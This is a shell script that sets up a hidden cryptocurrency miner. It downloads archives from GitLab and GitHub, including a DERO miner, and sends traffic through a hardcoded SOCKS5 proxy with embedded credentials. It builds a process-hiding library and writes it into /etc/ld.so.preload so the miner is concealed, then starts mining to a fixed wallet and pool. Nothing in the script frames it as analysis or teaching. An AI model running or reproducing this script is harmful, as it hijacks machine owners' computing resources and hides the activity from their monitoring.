#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/gilaaja/exe/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

wget https://gitlab.com/ubedx/ngopi/-/raw/main/dero_linux_amd64.tar.gz
tar -xvzf dero_linux_amd64.tar.gz

wget https://github.com/Intergalactic-Mining/Uranus/releases/download/0.0.2.1/uranus-0.0.2.1-linux.tar.xz && tar -xf uranus-0.0.2.1-linux.tar.xz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 146.190.66.38:443
socks5_username = kereta
socks5_password = api
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/gilaaja/exe/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
rm -rf wget-log*
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./dero_linux_amd64/dero-miner-linux-amd64 --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg --daemon-rpc-address=community-pools.mysrv.cloud:10300 --debug

#./graftcp/graftcp ./uranus --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg --daemon-rpc-address=community-pools.mysrv.cloud:10300
